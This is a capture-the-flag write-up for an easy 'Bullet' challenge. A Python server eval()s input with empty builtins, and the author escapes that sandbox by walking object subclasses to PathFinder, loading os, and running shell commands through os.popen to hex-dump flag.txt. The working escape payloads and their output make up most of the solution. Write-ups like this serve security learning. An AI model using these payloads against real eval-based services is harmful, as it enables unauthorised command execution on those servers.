```
                    ▗▄▄▖ █  ▐▌█ █ ▗▞▀▚▖   ■  
                    ▐▌ ▐▌▀▄▄▞▘█ █ ▐▛▀▀▘▗▄▟▙▄▖
                    ▐▛▀▚▖     █ █ ▝▚▄▄▖  ▐▌  
                    ▐▙▄▞▘     █ █        ▐▌  
                                         ▐▌  
```

**Category:** MISC
**Level:** Easy
**Instance:** `nc 34.252.33.37 32034`
> Bullet: Where your Python commands are like boomerangs—throw them carefully, or they'll come back to bite you!

**Flag:** FlagY{b0f90142f8098411057bd5237991cb1b}

# WHAT EVEN IS THIS

A tiny interactive Python server asks us to type an expression and then lovingly `eval()`s it for us:

```python
# server.py
print("Welcome to Bullet!")
print("Goal: Can you execute commands?")

while True:
    try:
        user_input = input(">>> ")
        result = eval(user_input, {"__builtins__": {}})
        print("Result:", result)
    except Exception as e:
        print("Error:", e)
```

Our mission: make the server run shell commands and reveal the flag.

# WHY THIS IS A PROBLEM (TL;DR)

`eval()` with `{"__builtins__": {}}` looks like a prison cell for our code. But Python's object model has windows and those windows have ladders. By poking `().__class__.__mro__` and its subclasses we can find import machinery (hello `PathFinder`), use it to build an os module object, and then ask `os.popen()` to execute a shell command. ***Boom: command execution.***

# SOLUTION

First things first, we need to check which classes are available.

```python
>>> [i.__name__ for i in ().__class__.__mro__[1].__subclasses__()][:200]
Result: ['type', 'async_generator', 'bytearray_iterator', 'bytearray', 'bytes_iterator', 'bytes', 'builtin_function_or_method', 'callable_iterator', 'PyCapsule', 'cell', 'classmethod_descriptor', 'classmethod', 'code', 'complex', 'Token', 'ContextVar', 'Context', 'coroutine', 'dict_items', 'dict_itemiterator', 'dict_keyiterator', 'dict_valueiterator', 'dict_keys', 'mappingproxy', 'dict_reverseitemiterator', 'dict_reversekeyiterator', 'dict_reversevalueiterator', 'dict_values', 'dict', 'ellipsis', 'enumerate', 'filter', 'float', 'frame', 'FrameLocalsProxy', 'frozenset', 'function', 'generator', 'getset_descriptor', 'instancemethod', 'list_iterator', 'list_reverseiterator', 'list', 'longrange_iterator', 'int', 'map', 'member_descriptor', 'memoryview', 'method_descriptor', 'method', 'moduledef', 'module', 'odict_iterator', 'PickleBuffer', 'property', 'range_iterator', 'range', 'reversed', 'symtable entry', 'iterator', 'set_iterator', 'set', 'slice', 'staticmethod', 'stderrprinter', 'super', 'traceback', 'tuple_iterator', 'tuple', 'str_iterator', 'str', 'wrapper_descriptor', 'zip', 'GenericAlias', 'anext_awaitable', 'async_generator_asend', 'async_generator_athrow', 'async_generator_wrapped_value', '_buffer_wrapper', 'MISSING', 'coroutine_wrapper', 'generic_alias_iterator', 'items', 'keys', 'values', 'hamt_array_node', 'hamt_bitmap_node', 'hamt_collision_node', 'hamt', 'InstructionSequence', 'legacy_event_handler', 'line_iterator', 'managedbuffer', 'memory_iterator', 'method-wrapper', 'SimpleNamespace', 'NoneType', 'NotImplementedType', 'positions_iterator', 'str_ascii_iterator', 'UnionType', 'CallableProxyType', 'ProxyType', 'ReferenceType', 'TypeAliasType', 'NoDefaultType', 'Generic', 'TypeVar', 'TypeVarTuple', 'ParamSpec', 'ParamSpecArgs', 'ParamSpecKwargs', 'EncodingMap', 'fieldnameiterator', 'formatteriterator', 'BaseException', '_WeakValueDictionary', '_BlockingOnManager', '_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'BuiltinImporter', 'FrozenImporter', '_ImportLockContext', '_ThreadHandle', 'lock', 'RLock', '_localdummy', '_local', 'IncrementalNewlineDecoder', '_BytesIOBuffer', '_IOBase', 'ScandirIterator', 'DirEntry', 'WindowsRegistryFinder', '_LoaderBasics', 'FileLoader', '_NamespacePath', 'NamespaceLoader', 'PathFinder', 'FileFinder', 'AST', 'Codec', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_abc_data', 'ABC', 'Hashable', 'Awaitable', 'AsyncIterable', 'Iterable', 'Sized', 'Container', 'Buffer', 'Callable', '_wrap_close', 'Quitter', '_Printer', '_Helper']
```

The code spits out a LOT of class names, including `PathFinder` and module. Those are our hooks. So from there, we devise a payload that loads `os` and runs `ls -la`. Hell man, we need to know where `flag.txt` is.

Basically, this payload (1) scan subclasses for PathFinder, (2) build a bare module object, (3) use `PathFinder.find_spec('os')` to get a loader spec for `os`, (4) `exec_module(mod)` fills the `module` object with the real `os` functions, and (5) `mod.__getattribute__('popen')('sh -c '+cmd).read()` runs `cmd` in a shell and reads the output.

```python
>>> (lambda PF, MT, cmd: (lambda spec: (lambda mod: (spec.loader.exec_module(mod), mod.__getattribute__('popen')('sh -c '+cmd).read())[1])(MT('os')))(PF.find_spec('os')))([c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__=='PathFinder'][0],[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__=='module'][0],'ls -la')
Result: flag.txt
run
server.py
```

***STOP!*** I know where your head went. You can't use `cat` or any of the alternatives because the server will choke. Don't believe me? Try it.

![i-triple-dog-dare-you](/assets/images/i-triple-dog-dare-you.gif)

It took me quite a while and lots and lots of trial-and-errors to get to the revelation of using hex dump.

```python
>>> (lambda PF, MT, cmd: (lambda spec: (lambda mod: (spec.loader.exec_module(mod), mod.__getattribute__('popen')('sh -c '+cmd).read())[1])(MT('os')))(PF.find_spec('os')))([c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__=='PathFinder'][0],[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__=='module'][0],"printf '%.64s' \"\" > /dev/null; (command -v xxd >/dev/null 2>&1 && xxd -l64 flag.txt) || (od -An -tx1 -N64 flag.txt 2>/dev/null || true)")
%.64s: 1: printf: usage: printf format [arg ...]
Result:  46 6c 61 67 59 7b 62 30 66 39 30 31 34 32 66 38
 30 39 38 34 31 31 30 35 37 62 64 35 32 33 37 39
 39 31 63 62 31 62 7d 0a
```

From there, your road is easy.

```bash
> echo '46 6c 61 67 59 7b 62 30 66 39 30 31 34 32 66 38 30 39 38 34 31 31 30 35 37 62 64 35 32 33 37 39 39 31 63 62 31 62 7d 0a' | tr -d ' \n' | xxd -r -p

FlagY{b0f90142f8098411057bd5237991cb1b}
```

![well-hello-beautiful](/assets/images/well-hello-beautiful.gif)